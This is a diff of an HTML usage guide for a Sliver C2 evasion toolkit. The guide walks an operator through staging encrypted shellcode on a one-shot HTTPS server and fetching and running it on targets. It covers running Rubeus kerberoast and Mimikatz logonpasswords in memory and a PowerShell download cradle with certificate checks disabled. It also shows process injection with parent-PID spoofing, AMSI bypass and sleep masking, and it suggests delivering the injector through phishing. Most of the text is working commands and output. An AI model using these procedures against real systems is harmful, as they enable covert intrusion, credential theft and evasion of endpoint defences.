@@ -235,17 +235,18 @@
 
           <h3>3.4 Operator Workflow</h3>
 <pre><code class="language-bash"># First time only — install the extension into Sliver
-sliver (TARGET)&gt; extensions install /home/kali/Sliver-Evasion-Suite/Loader-Kit/loadkit/build/load-0.1.0.tar.gz
+sliver (TARGET)&gt; extensions install build/load-0.1.0.tar.gz
 
 # Convert + encrypt + serve in one shot
 ./loadkit load \
-    --binary /home/kali/tools/Rubeus.exe \
+    --binary Rubeus.exe \
     --args "kerberoast /nowrap" \
-    --url https://192.168.1.10:8443/p \
+    --url https://192.168.1.10:8443 \
     --serve
 
-# Output prints the exact Sliver command + key:
-#   sliver (TARGET)&gt; load url=https://... key=&lt;64 hex chars&gt;</code></pre>
+# The output prints the complete Sliver command with the real URL.
+# Copy and paste it — the path is auto-generated and only that URL works:
+#   sliver (TARGET)&gt; load url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3d4...</code></pre>
 
           <h3>3.5 Evasion Techniques in Loader Kit</h3>
           <ul>
@@ -274,33 +275,42 @@ sliver (TARGET)&gt; extensions install /home/kali/Sliver-Evasion-Suite/Loader-Ki
           <h3 id="loader-kit-usage">3.7 Full Usage</h3>
 
           <h4>3.7.1 One-Time Setup &mdash; Install the Extension</h4>
-          <p>The extension is installed once per Sliver server instance and persists across sessions. You don&rsquo;t need to reinstall before every run.</p>
-<pre><code class="language-bash">cd /home/kali/Sliver-Evasion-Suite/Loader-Kit/loadkit
+          <p>The extension is installed once per Sliver server instance and persists across sessions. You don&rsquo;t need to reinstall before every run. The tarball contains a flat root structure: <code>./extension.json</code> and <code>./load.x64.dll</code>.</p>
+<pre><code class="language-bash">cd Loader-Kit/loadkit
 make bundle                           # produces build/load-0.1.0.tar.gz</code></pre>
-<pre><code class="language-bash">sliver (TARGET)&gt; extensions install /home/kali/Sliver-Evasion-Suite/Loader-Kit/loadkit/build/load-0.1.0.tar.gz
+<pre><code class="language-bash">sliver (TARGET)&gt; extensions install build/load-0.1.0.tar.gz
 
 [*] Installing extension 'load' (v0.1.0) ... done</code></pre>
 
           <h4>3.7.2 Running a .NET Assembly (Rubeus, SharpHound, Certify, &hellip;)</h4>
 <pre><code class="language-bash"># Step 1 — Prepare the payload (operator side)
-cd /home/kali/Sliver-Evasion-Suite/Loader-Kit/loadkit
+cd Loader-Kit/loadkit
 
 ./loadkit load \
-    --binary /home/kali/tools/Rubeus.exe \
+    --binary Rubeus.exe \
     --args "kerberoast /nowrap" \
-    --url https://192.168.1.10:8443/p \
-    --serve</code></pre>
+    --url https://192.168.1.10:8443 \
+    --serve
+
+# --url only needs the scheme and host:port.
+# The path is always auto-generated. Whatever you put after the port is ignored.</code></pre>
 <pre><code class="language-bash">[*] Converting Rubeus.exe to Donut shellcode ...
 [+] Shellcode: 1245184 bytes (AMSI+WLDP bypass, Chaskey-CTR module encryption)
-[+] XOR key generated: 32 bytes
+
 [+] payload → build/payload.enc (1245200 bytes)
-[+] url     → https://192.168.1.10:8443/p
+[+] key     → a1b2c3d4e5f6...
 
-[i] Execute in an active session:
-    sliver (TARGET)&gt; load url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3d4e5f6...
+[i] First time (once per Sliver server):
+    sliver&gt; extensions install build/load-0.1.0.tar.gz
 
-[*] Starting one-time HTTPS server on :8443 ...</code></pre>
-<pre><code class="language-bash"># Step 2 — Execute in Sliver
+[*] One-shot HTTPS server on :8443 — shuts down after one download
+[+] Staging URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
+    (random path generated automatically — only this URL works)
+
+[i] Execute in Sliver:
+    sliver (TARGET)&gt; load url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3d4e5f6...</code></pre>
+          <p>The server hosts one encrypted blob at that single random URL. There is no directory listing and no way to find it by guessing. It serves exactly once and shuts down. Copy the <code>[i] Execute in Sliver:</code> line directly.</p>
+<pre><code class="language-bash"># Step 2 — Execute in Sliver (use the URL printed above, not the one you typed)
 sliver (TARGET)&gt; load url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3d4e5f6...
 
 [*] Waiting for output (timeout: 5m)...
@@ -319,48 +329,47 @@ $krb5tgs$23$*svc_sql$CORP.LOCAL$...HASH...*</code></pre>
 
           <h4>3.7.3 Running a Native EXE (WinPEAS, Mimikatz, Seatbelt, &hellip;)</h4>
 <pre><code class="language-bash">./loadkit load \
-    --binary /home/kali/tools/winpeas.exe \
-    --url https://192.168.1.10:8443/p2 \
+    --binary winpeas.exe \
+    --url https://192.168.1.10:8443 \
     --serve
 
-# Then in Sliver:
-sliver (TARGET)&gt; load url=https://192.168.1.10:8443/... key=...
-# WinPEAS runs in memory; the full enumeration output streams back to the console.</code></pre>
+# Copy the [i] Execute in Sliver: command from the output and paste it in.
+# WinPEAS runs entirely in memory. The full enumeration output comes back to the console.</code></pre>
 
           <h4>3.7.4 Running a DLL with a Specific Export</h4>
 <pre><code class="language-bash">./loadkit load \
-    --binary /home/kali/tools/mimikatz.dll \
+    --binary mimikatz.dll \
     --method "sekurlsa::logonpasswords" \
-    --url https://192.168.1.10:8443/p3 \
+    --url https://192.168.1.10:8443 \
     --serve
 
-# In Sliver — output of the export is captured via stdout pipe
-sliver (TARGET)&gt; load url=https://192.168.1.10:8443/... key=...</code></pre>
+# Copy the [i] Execute in Sliver: command from the output and paste it in.</code></pre>
 
           <h4>3.7.5 Decoupled Build &amp; Serve</h4>
-          <p>If you want to prepare the payload now and serve it later (e.g. from a redirector or a different operator box):</p>
+          <p>Prepare the payload now and serve it later, for example from a redirector or a different machine:</p>
 <pre><code class="language-bash"># Step 1 — convert + encrypt only (no server)
 ./loadkit load \
     --binary rubeus.exe \
     --args "kerberoast /nowrap" \
-    --url https://192.168.1.10:8443/p
-# → writes build/payload.enc; prints the sliver command + key
+    --url https://192.168.1.10:8443
+# Writes build/payload.enc and prints the key.
+# Run 'loadkit serve' separately when you are ready — that is when the random URL is generated.
 
-# Step 2 — serve later (or from a different host)
+# Step 2 — serve when ready; the output prints the random URL to use in Sliver
 ./loadkit serve --payload build/payload.enc --port 8443</code></pre>
 
           <h4>3.7.6 Staging Multiple Tools Concurrently</h4>
-<pre><code class="language-bash"># Terminal 1 — Rubeus on port 8443
+<pre><code class="language-bash"># Terminal 1 — Rubeus on port 8443 (prints its own random URL)
 ./loadkit load --binary rubeus.exe --args "kerberoast /nowrap" \
-    --url https://192.168.1.10:8443/p --serve
+    --url https://192.168.1.10:8443 --serve
 
-# Terminal 2 — WinPEAS on port 8444
+# Terminal 2 — WinPEAS on port 8444 (prints its own random URL)
 ./loadkit load --binary winpeas.exe \
-    --url https://192.168.1.10:8444/p --serve
+    --url https://192.168.1.10:8444 --serve
 
-# Sliver — both run concurrently in the agent process
-sliver (TARGET)&gt; load url=https://192.168.1.10:8443/p key=...
-sliver (TARGET)&gt; load url=https://192.168.1.10:8444/p key=...</code></pre>
+# In Sliver — use each URL that was printed above, not a fixed path
+sliver (TARGET)&gt; load url=https://192.168.1.10:8443/&lt;random1&gt; key=&lt;key1&gt;
+sliver (TARGET)&gt; load url=https://192.168.1.10:8444/&lt;random2&gt; key=&lt;key2&gt;</code></pre>
 
           <h4>3.7.7 Command Reference</h4>
           <table class="custom-table">
@@ -509,14 +518,14 @@ sliver &gt; generate \
     --mtls 192.168.1.10 \
     --sleep 60s \
     --jitter 10 \
-    --save /home/kali/implant.bin</code></pre>
+    --save implant.bin</code></pre>
           <p>The masking threshold defaults to 5000ms. Any wait &ge; 5s triggers masking, so the 60s C2 sleep is caught while goroutine-internal waits (typically &lt;100ms) are ignored.</p>
 
           <h4>4.5.2 Wrap with MaskKit</h4>
-<pre><code class="language-bash">cd /home/kali/Sliver-Evasion-Suite/Sleep-Mask-Kit/maskkit
+<pre><code class="language-bash">cd Sleep-Mask-Kit/maskkit
 
 ./maskkit wrap \
-    --shellcode /home/kali/implant.bin \
+    --shellcode implant.bin \
     --threshold 5000 \
     --output build/masked.bin</code></pre>
 <pre><code class="language-bash">[*] Shellcode: 589824 bytes
@@ -524,9 +533,9 @@ sliver &gt; generate \
 [+] Payload: 593384 bytes → build/masked.bin
 [+] Key: df41c021afc61efe5945c964a77d9b51f9ae1be85bfd2494e7ffd4f0e8b47321
 [+] Threshold: 5000 ms (waits &gt; 5s trigger masking)</code></pre>
-          <p>Or compile-and-wrap in one shot (recompiles the C masker objects if they&rsquo;re missing or stale):</p>
+          <p>Or compile-and-wrap in one shot (recompiles the C masker objects if they are missing or stale):</p>
 <pre><code class="language-bash">./maskkit make \
-    --shellcode /home/kali/implant.bin \
+    --shellcode implant.bin \
     --threshold 5000 \
     --output build/masked.bin</code></pre>
 
@@ -536,7 +545,7 @@ sliver &gt; generate \
 [*] Serving 593384 bytes on https://0.0.0.0:8443/3fa29c1d8e7b04a2</code></pre>
 
           <h4>4.5.4 Deliver and Execute</h4>
-          <p><code>masked.bin</code> is a flat PIC shellcode &mdash; deliver it via any injector or chain it through PalaceKit for an additional Crystal Kit loader wrapper. A minimal PowerShell cradle:</p>
+          <p><code>masked.bin</code> is a flat PIC shellcode — deliver it via any injector or chain it through PalaceKit for an additional Crystal Kit loader wrapper. A minimal PowerShell cradle:</p>
 <pre><code class="language-bash"># Download (target side)
 $wc = New-Object System.Net.WebClient
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
@@ -544,9 +553,9 @@ $sc = $wc.DownloadData("https://192.168.1.10:8443/3fa29c1d8e7b04a2")
 # Pass $sc into your preferred injector
 
 # Or chain through PalaceKit for the full stack
-cd /home/kali/Sliver-Evasion-Suite/Crystal-Palace-Kit/palacekit
+cd Crystal-Palace-Kit/palacekit
 ./palacekit build \
-    --shellcode /home/kali/Sliver-Evasion-Suite/Sleep-Mask-Kit/maskkit/build/masked.bin \
+    --shellcode Sleep-Mask-Kit/maskkit/build/masked.bin \
     --spec loader/loader.spec \
     --output build/palace_masked.bin</code></pre>
 
@@ -572,34 +581,40 @@ cd /home/kali/Sliver-Evasion-Suite/Crystal-Palace-Kit/palacekit
           <h3 id="sleepkit-usage">4.6 Full Usage &mdash; SleepKit</h3>
 
           <h4>4.6.1 Build the Masked EXE</h4>
-<pre><code class="language-bash">cd /home/kali/Sliver-Evasion-Suite/Sleep-Mask-Kit/sleepkit
+<pre><code class="language-bash">cd Sleep-Mask-Kit/sleepkit
 
 ./sleepkit build \
-    --shellcode /home/kali/implant.bin \
-    --url https://192.168.1.10:8443/p \
+    --shellcode implant.bin \
+    --url https://192.168.1.10:8443 \
     --sleep 30s \
-    --serve</code></pre>
-<pre><code class="language-bash">[*] Shellcode: 589824 bytes
-[+] Encrypted → build/payload.enc
-[+] EXE       → build/mask.exe (cross-compiled Windows x64)
-[*] Starting payload server on https://0.0.0.0:8443/p ...</code></pre>
-          <p>The build step XOR-32-encrypts the shellcode with a random 32-byte key, cross-compiles <code>mask.exe</code> with the key+URL baked in via <code>-ldflags</code>, and starts the one-shot HTTPS server.</p>
+    --serve
+
+# SleepKit is pure Go and does not require mingw-w64.
+# --url only needs the scheme and host:port — the random path is baked into mask.exe at build time.</code></pre>
+<pre><code class="language-bash">[+] payload  → build/payload.enc
+[+] mask.exe → build/mask.exe
+[+] sleep    → 30s (30000 ms)
+[*] One-shot HTTPS server on :8443 — shuts down after one download
+[+] Staging URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
+    (random path — baked into mask.exe, only this URL works)
+[i] Deliver mask.exe to target. It fetches shellcode and runs with sleep masking.</code></pre>
+          <p>The build step ChaCha20-Poly1305-encrypts the shellcode with a random key and nonce, cross-compiles <code>mask.exe</code> for Windows x64 with the key, nonce, and full staging URL baked in via <code>-ldflags</code>, and starts the one-shot HTTPS server. SleepKit uses pure Go cross-compilation (CGO_ENABLED=0) and does not need mingw-w64.</p>
 
           <h4>4.6.2 Deliver and Execute mask.exe</h4>
           <p>Transfer <code>build/mask.exe</code> to the target by any method and run it. On execution it:</p>
           <ol>
-            <li>Downloads <code>payload.enc</code> from the embedded URL via WinHTTP (ignores cert errors)</li>
-            <li>XOR-decrypts with the embedded key</li>
+            <li>Downloads <code>payload.enc</code> from the baked-in staging URL via Go <code>net/http</code> (InsecureSkipVerify; self-signed certs are fine)</li>
+            <li>Decrypts with ChaCha20-Poly1305 and the embedded key — exits immediately if the auth tag fails (tamper detection at no extra cost)</li>
             <li><code>NtAllocateVirtualMemory(PAGE_READWRITE)</code> &rarr; copy &rarr; <code>NtProtectVirtualMemory(PAGE_EXECUTE_READ)</code></li>
             <li>Installs the <code>kernel32!Sleep</code> JMP hook</li>
             <li>Starts the timer goroutine (masks every <code>--sleep</code> interval regardless of Sleep calls)</li>
             <li><code>NtCreateThreadEx</code> on the Sliver shellcode entry</li>
-            <li>The HTTPS server shuts down &mdash; URL is now dead</li>
+            <li>The HTTPS server shuts down; the staging URL is dead</li>
           </ol>
 
           <h4>4.6.3 Serving a Pre-Built Payload</h4>
 <pre><code class="language-bash">./sleepkit serve --payload build/payload.enc --port 8443</code></pre>
-          <p>The XOR key for SleepKit is baked into the EXE at build time. <strong>Do not</strong> reuse <code>payload.enc</code> with a different <code>mask.exe</code> &mdash; each build pairs one EXE with one payload.</p>
+          <p>The ChaCha20-Poly1305 key and nonce for SleepKit are baked into <code>mask.exe</code> at build time. <strong>Do not</strong> reuse <code>payload.enc</code> with a different <code>mask.exe</code> — each build generates a matched pair. If you rebuild the EXE, a new <code>payload.enc</code> is generated with a new key.</p>
 
           <h4>4.6.4 SleepKit Command Reference</h4>
           <table class="custom-table">
@@ -649,11 +664,12 @@ char _PICO_[0] __attribute__((section("pico")));</code></pre>
           <p>So when <code>go()</code> runs, the encrypted Sliver shellcode and the XOR key are read directly from the loader&rsquo;s own memory &mdash; no file I/O, no network request, no separate stage.</p>
 
           <h3>5.4 The Spec DSL</h3>
+          <p>The C sources are compiled as a <strong>unity build</strong>: <code>unity.c</code> includes all main loader sources into one translation unit, producing a single <code>loader.x64.o</code>. This eliminates the cross-TU global pointer indirection that MinGW generates, which is incompatible with PIC shellcode. Stub files (<code>pico.c</code>, <code>hooks.c</code>, <code>spoof.c</code>, <code>cfg.c</code>, <code>cleanup.c</code>) are compiled as separate objects because they need to remain swappable.</p>
 <pre><code class="language-bash">x64:
     load "bin/loader.x64.o"
-        make pic +gofirst
-    load "bin/services.x64.o"
-        merge
+        make pic +gofirst +optimize
+        # unity build: loader.c + services.c + all stubs compiled via unity.c
+        # +optimize is a Crystal Palace hint; PalaceKit accepts and ignores it
 
     generate $MASK 128                    ← random 128-byte XOR key
 
@@ -708,7 +724,7 @@ crystalkit inject
        │
        ▼
 Deliver loader.exe to target
-  • Fetch payload.enc via WinHTTP (ignores cert errors)
+  • Fetch payload.enc via Go net/http (InsecureSkipVerify; self-signed certs are fine)
   • ChaCha20-Poly1305 decrypt (exits if tampered — auth tag check)
   • Find a host process: RuntimeBroker.exe → SgrmBroker.exe →
     WerFault.exe → dllhost.exe → spawn notepad.exe suspended
@@ -727,7 +743,8 @@ Sliver callbacks to C2</code></pre>
        │  (uses PalaceKit or crystalpalace.jar)
        ▼
 PalaceKit build
-  • Compile loader.c, services.c, pico.c, etc. (8 COFF .o files)
+  • Unity build: unity.c compiles all main C sources into loader.x64.o
+  • 5 stub objects: pico, hooks, spoof, cfg, cleanup (6 COFF objects total)
   • Process loader.spec through COFF linker
   • Embed XOR'd shellcode in "dll" section
   • Build PICO blob (two no-op stubs) for "pico" section
@@ -762,25 +779,25 @@ Deliver palace.bin via any method (or chain through MaskKit/SleepKit first)
     --os windows \
     --arch amd64 \
     --mtls 192.168.1.10 \
-    --save /home/kali/implant.bin</code></pre>
-          <p><strong>Critical:</strong> always use <code>--format shellcode</code>, not <code>--format shared</code>. A shared DLL spawns a second Go runtime inside the host process and conflicts with anything that already has one.</p>
+    --save implant.bin</code></pre>
+          <p><strong>Critical:</strong> always use <code>--format shellcode</code>, not <code>--format shared</code>. A shared DLL would start a second Go runtime inside the host process, which conflicts with anything that already has one running.</p>
 
           <h4>5.9.2 Build the PIC Loader</h4>
-<pre><code class="language-bash">cd /home/kali/Sliver-Evasion-Suite/Crystal-Palace-Kit/palacekit
+<pre><code class="language-bash">cd Crystal-Palace-Kit/palacekit
 
 ./palacekit build \
-    --shellcode /home/kali/implant.bin \
+    --shellcode implant.bin \
     --spec loader/loader.spec \
     --output build/palace.bin</code></pre>
 <pre><code class="language-bash">[*] Shellcode: 589824 bytes
 [+] Loader: 4218 bytes → build/palace.bin</code></pre>
-          <p>The build runs the full pipeline: evaluate <code>loader.spec</code>, merge all 8 COFF loader objects, generate a fresh 128-byte XOR key, XOR-encrypt the Sliver shellcode and embed it in the <code>dll</code> section, assemble the PICO blob (two no-op stubs) in the <code>pico</code> section, and emit a flat ~4 KB PIC shellcode.</p>
+          <p>The build runs the full pipeline: evaluate <code>loader.spec</code>, merge the 6 COFF loader objects (<code>loader.x64.o</code> is a unity build of all main C sources; the remaining 5 are stub objects), generate a fresh 128-byte XOR key, XOR-encrypt the Sliver shellcode and embed it in the <code>dll</code> section, assemble the PICO blob (two no-op stubs) in the <code>pico</code> section, and emit a flat ~4 KB PIC shellcode.</p>
 
           <h4>5.9.3 Compile-and-Build in One Command</h4>
 <pre><code class="language-bash">./palacekit make-loader \
-    --shellcode /home/kali/implant.bin \
+    --shellcode implant.bin \
     --output build/palace.bin</code></pre>
-          <p>This recompiles all 8 C loader objects with mingw before linking. Use this on a fresh checkout or after editing any C source.</p>
+          <p>This recompiles all C loader objects with mingw-w64 via the unity build before linking. Use this on a fresh checkout or after editing any C source.</p>
 
           <h4>5.9.4 Serve and Deliver</h4>
 <pre><code class="language-bash">./palacekit serve --payload build/palace.bin --port 8443
@@ -800,7 +817,10 @@ RtlExitUserThread            0xFF7F061A
 VirtualAlloc                 0x91AFCA54
 VirtualProtect               0x7946C61B
 VirtualFree                  0x030633AC
-LoadLibraryA                 0xEC0E4E8E</code></pre>
+LoadLibraryA                 0xEC0E4E8E
+GetProcAddress               0x7C0DFCAA
+LoadLibraryW                 0xEC0E4EA4
+ExitThread                   0x60E0CEEF</code></pre>
           <p>If you modify <code>services.c</code> or add a new API, run this and update the <code>#define H_*</code> constants in <code>src/services.c</code> to match.</p>
 
           <h4>5.9.6 PalaceKit Command Reference</h4>
@@ -819,23 +839,22 @@ LoadLibraryA                 0xEC0E4E8E</code></pre>
 
           <h4>5.10.1 Process Injector Workflow (No Crystal Palace Needed)</h4>
           <p>The primary CrystalKit workflow is a self-contained process injector and doesn&rsquo;t need PalaceKit or Crystal Palace at all. It encrypts with ChaCha20-Poly1305, cross-compiles a Go stager with key + URL baked in, and injects into a chosen host process on target.</p>
-<pre><code class="language-bash">cd /home/kali/Sliver-Evasion-Suite/Crystal-Palace-Kit/crystalkit
+<pre><code class="language-bash">cd Crystal-Palace-Kit/crystalkit
 
 ./crystalkit inject \
-    --shellcode /tmp/implant.bin \
-    --url https://192.168.1.10:8443/p \
+    --shellcode implant.bin \
+    --url https://192.168.1.10:8443 \
     --output build/ \
     --garble \
     --serve</code></pre>
-          <p>Output:</p>
-          <ul>
-            <li><code>build/payload.enc</code> &mdash; ChaCha20-Poly1305 encrypted shellcode</li>
-            <li><code>build/loader.exe</code> &mdash; Windows x64 EXE with key+URL embedded; symbol-obfuscated with garble</li>
-            <li>One-shot HTTPS server at <code>https://192.168.1.10:8443/p</code> (random URL path)</li>
-          </ul>
+<pre><code class="language-bash">[+] payload     → build/payload.enc
+[+] loader.exe  → build/loader.exe
+[*] One-shot HTTPS server on :8443 — shuts down after one download
+[+] Staging URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
+    (random path baked into loader.exe — only this URL works)</code></pre>
           <p>Deliver <code>loader.exe</code>. On execution it:</p>
           <ol>
-            <li>Fetches <code>payload.enc</code> via WinHTTP (ignores cert errors)</li>
+            <li>Fetches <code>payload.enc</code> via Go net/http (InsecureSkipVerify; self-signed certs are fine)</li>
             <li>Decrypts with ChaCha20-Poly1305 &mdash; exits silently if the auth tag doesn&rsquo;t match (tamper detection)</li>
             <li>Searches for a host: <code>RuntimeBroker.exe</code> &rarr; <code>SgrmBroker.exe</code> &rarr; <code>WerFault.exe</code> &rarr; <code>dllhost.exe</code> &rarr; spawn <code>notepad.exe</code> suspended</li>
             <li><code>NtAllocateVirtualMemory(host, PAGE_READWRITE)</code> &rarr; <code>NtWriteVirtualMemory(host)</code> &rarr; <code>NtProtectVirtualMemory(host, PAGE_EXECUTE_READ)</code></li>
@@ -846,8 +865,8 @@ LoadLibraryA                 0xEC0E4E8E</code></pre>
           <h4>5.10.2 Crystal Palace PICO Implant Workflow</h4>
           <p>For the full Crystal Palace loader experience, route the shellcode through PalaceKit (or <code>crystalpalace.jar</code> if you have it) before staging:</p>
 <pre><code class="language-bash">./crystalkit implant \
-    --shellcode /tmp/implant.bin \
-    --url https://192.168.1.10:8443/p \
+    --shellcode implant.bin \
+    --url https://192.168.1.10:8443 \
     --serve</code></pre>
           <p>This invokes PalaceKit to build the COFF-linked PIC shellcode, then stages it via the same one-shot HTTPS server CrystalKit uses for the inject workflow.</p>
 
@@ -858,7 +877,7 @@ LoadLibraryA                 0xEC0E4E8E</code></pre>
           <p>Use this to convert a post-exploitation DLL into the PICO format so it can be dispatched through Crystal Palace&rsquo;s tag-based execution. Requires either Crystal Palace or PalaceKit.</p>
 
           <h4>5.10.4 Stage Existing Payloads</h4>
-<pre><code class="language-bash">./crystalkit stage --serve \
+<pre><code class="language-bash">./crystalkit serve \
     --payload build/payload.enc \
     --port 8443</code></pre>
           <p>Restart the one-shot server for a previously-built <code>payload.enc</code> &mdash; for example, after the original server shut down because the first fetch failed.</p>
@@ -874,7 +893,7 @@ LoadLibraryA                 0xEC0E4E8E</code></pre>
               <tr><td><code>crystalkit inject</code></td><td><code>--shellcode</code>, <code>--url</code>, <code>--output</code>, <code>--garble</code>, <code>--serve</code></td><td>Build ChaCha20-Poly1305 staged process injector (no Crystal Palace needed)</td></tr>
               <tr><td><code>crystalkit implant</code></td><td><code>--shellcode</code>, <code>--url</code>, <code>--serve</code></td><td>Build the full Crystal Palace PICO loader (uses PalaceKit)</td></tr>
               <tr><td><code>crystalkit postex</code></td><td><code>--dll</code>, <code>--output</code></td><td>Wrap a post-ex DLL in PICO format</td></tr>
-              <tr><td><code>crystalkit stage</code></td><td><code>--serve</code>, <code>--payload</code>, <code>--port</code></td><td>Restart the one-shot HTTPS server for an existing payload</td></tr>
+              <tr><td><code>crystalkit serve</code></td><td><code>--payload</code>, <code>--port</code></td><td>Restart the one-shot HTTPS server for an existing payload</td></tr>
               <tr><td><code>crystalkit build-ext</code></td><td>&mdash;</td><td>Build all C-based Sliver extensions in the repo</td></tr>
               <tr><td><code>crystalkit bundle</code></td><td>&mdash;</td><td>Package built extensions into Sliver tarballs</td></tr>
             </tbody>
@@ -942,11 +961,11 @@ Both scenarios: shellcode calls back to Sliver C2</code></pre>
 
           <h4>Target Mode</h4>
           <p>Finds a running process by name and injects into it. The process must be accessible from your integrity level (user-level processes are fine; SYSTEM-level ones typically are not).</p>
-<pre><code class="language-bash"># From a Sliver session:
-inject url=https://192.168.1.10:8443/p key=a1b2c3... target=explorer.exe
+<pre><code class="language-bash"># From a Sliver session (use the full staging URL printed by injectkit stage):
+inject url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3... target=explorer.exe
 
 # Standalone EXE on target:
-injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -target explorer.exe</code></pre>
+injectkit.exe -mode stager -url https://192.168.1.10:8443/a3f91c04b2e8d17f -key a1b2c3... -target explorer.exe</code></pre>
 <pre><code class="language-bash">Execution chain (target mode):
 
   1. Fetch + XOR-decrypt shellcode from staging URL
@@ -959,11 +978,11 @@ injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -targ
 
           <h4>Spawn Mode</h4>
           <p>Spawns a fresh process with a spoofed parent PID, then injects into it. The spawned process shows up in the process tree under whichever parent you chose, regardless of who actually created it.</p>
-<pre><code class="language-bash"># From a Sliver session:
-inject url=https://192.168.1.10:8443/p key=a1b2c3... spawn=RuntimeBroker.exe ppid=explorer.exe
+<pre><code class="language-bash"># From a Sliver session (use the full staging URL printed by injectkit stage):
+inject url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3... spawn=RuntimeBroker.exe ppid=explorer.exe
 
 # Standalone EXE on target:
-injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -spawn RuntimeBroker.exe -ppid explorer.exe</code></pre>
+injectkit.exe -mode stager -url https://192.168.1.10:8443/a3f91c04b2e8d17f -key a1b2c3... -spawn RuntimeBroker.exe -ppid explorer.exe</code></pre>
 <pre><code class="language-bash">Execution chain (spawn mode):
 
   1. Fetch + XOR-decrypt shellcode
@@ -1029,25 +1048,28 @@ make all</code></pre>
           <p>Use this when you have no Sliver session yet. Get shellcode to the target, run the EXE, get a callback. The EXE exits after injection so there is no persistent injector process to clean up.</p>
 
           <h4>6.8.1 Encrypt and Stage (Operator Side)</h4>
-<pre><code class="language-bash">cd /home/kali/Sliver-Evasion-Suite/Inject-Kit/injectkit
+<pre><code class="language-bash">cd Inject-Kit/injectkit
 
 ./injectkit stage \
-    --shellcode /home/kali/palace.bin \
-    --url https://192.168.1.10:8443/p \
+    --shellcode palace.bin \
+    --url https://192.168.1.10:8443 \
     --serve</code></pre>
-<pre><code class="language-bash">[+] XOR key: a1b2c3d4e5f6...
-[+] payload → build/payload.enc
-[*] One-shot HTTPS server on :8443 ...
+<pre><code class="language-bash">[+] payload → build/payload.enc
+[+] key     → a1b2c3d4e5f6...
+[*] One-shot HTTPS server on :8443 — shuts down after one download
+[+] Staging URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
+    (random path generated automatically — only this URL works)
 
 Run on target:
-  injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -spawn RuntimeBroker.exe -ppid explorer.exe</code></pre>
+  injectkit.exe -mode stager -url https://192.168.1.10:8443/a3f91c04b2e8d17f \
+                -key a1b2c3d4e5f6... -spawn RuntimeBroker.exe -ppid explorer.exe</code></pre>
           <p>Copy the printed command. Deliver <code>injectkit.exe</code> to the target via phishing, exploit, or whatever got you initial access and run it.</p>
 
           <h4>6.8.2 Stager Mode &mdash; Inject into Running Process</h4>
-<pre><code class="language-bash">injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -target explorer.exe</code></pre>
+<pre><code class="language-bash">injectkit.exe -mode stager -url https://192.168.1.10:8443/a3f91c04b2e8d17f -key a1b2c3... -target explorer.exe</code></pre>
 
           <h4>6.8.3 Stager Mode &mdash; Spawn with PPID Spoof</h4>
-<pre><code class="language-bash">injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -spawn RuntimeBroker.exe -ppid explorer.exe</code></pre>
+<pre><code class="language-bash">injectkit.exe -mode stager -url https://192.168.1.10:8443/a3f91c04b2e8d17f -key a1b2c3... -spawn RuntimeBroker.exe -ppid explorer.exe</code></pre>
           <p><code>RuntimeBroker.exe</code> shows up under <code>explorer.exe</code> in the process tree. The EXE exits silently with no console output.</p>
 
           <h4>6.8.4 Direct Mode &mdash; Shellcode Baked In</h4>
@@ -1069,6 +1091,7 @@ injectkit.exe -mode direct -target explorer.exe</code></pre>
 
           <h4>6.8.5 Re-Serve for a Second Attempt</h4>
 <pre><code class="language-bash">./injectkit serve --payload build/payload.enc --port 8443</code></pre>
+          <p><strong>Note:</strong> <code>injectkit serve</code> generates a new random URL path every time it runs. The URL baked into your existing <code>injectkit.exe</code> or Sliver extension command will not match. Either re-run <code>injectkit stage</code> to rebuild the EXE with the new URL, or deliver the new staging URL manually if your target can accept it.</p>
 
           <h4>6.8.6 Getting <code>injectkit.exe</code> to the Target</h4>
           <table class="custom-table">
@@ -1085,26 +1108,30 @@ injectkit.exe -mode direct -target explorer.exe</code></pre>
           <p>Once you have an active Sliver session, <code>inject.x64.dll</code> works exactly like <code>load.x64.dll</code> from LoadKit: install it once, call it from the console. The Extension fetches the payload directly from your staging server over HTTPS, the same way LoadKit does. It does not route the payload through the Sliver C2 channel.</p>
 
           <h4>6.9.1 Install the Extension (Once Per Sliver Server)</h4>
-<pre><code class="language-bash">cd /home/kali/Sliver-Evasion-Suite/Inject-Kit/injectkit
+<pre><code class="language-bash">cd Inject-Kit/injectkit
 make all</code></pre>
 <pre><code class="language-bash">sliver (TARGET)&gt; extensions install build/inject-0.1.0.tar.gz
 [*] Installing extension 'inject' (v0.1.0) ... done</code></pre>
           <p>The extension persists for the Sliver server&rsquo;s lifetime. Install it once and it is available from every session.</p>
 
           <h4>6.9.2 Stage the Shellcode (Operator Side)</h4>
-<pre><code class="language-bash">cd /home/kali/Sliver-Evasion-Suite/Inject-Kit/injectkit
+<pre><code class="language-bash">cd Inject-Kit/injectkit
 
 ./injectkit stage \
-    --shellcode /home/kali/palace2.bin \
-    --url https://192.168.1.10:8443/r \
+    --shellcode palace2.bin \
+    --url https://192.168.1.10:8443 \
     --serve</code></pre>
+<pre><code class="language-bash">[+] payload → build/payload.enc
+[+] key     → b9c8d7e6f5a4...
+[*] One-shot HTTPS server on :8443 — shuts down after one download
+[+] Staging URL: https://192.168.1.10:8443/f7e2a91b3c04d58e</code></pre>
 
           <h4>6.9.3 Inject into an Existing Process</h4>
-<pre><code class="language-bash">sliver (TARGET)&gt; inject url=https://192.168.1.10:8443/r key=a1b2c3... target=explorer.exe
+<pre><code class="language-bash">sliver (TARGET)&gt; inject url=https://192.168.1.10:8443/f7e2a91b3c04d58e key=b9c8d7e6f5a4... target=explorer.exe
 [+] injected into explorer.exe (pid 1234) — shellcode running</code></pre>
 
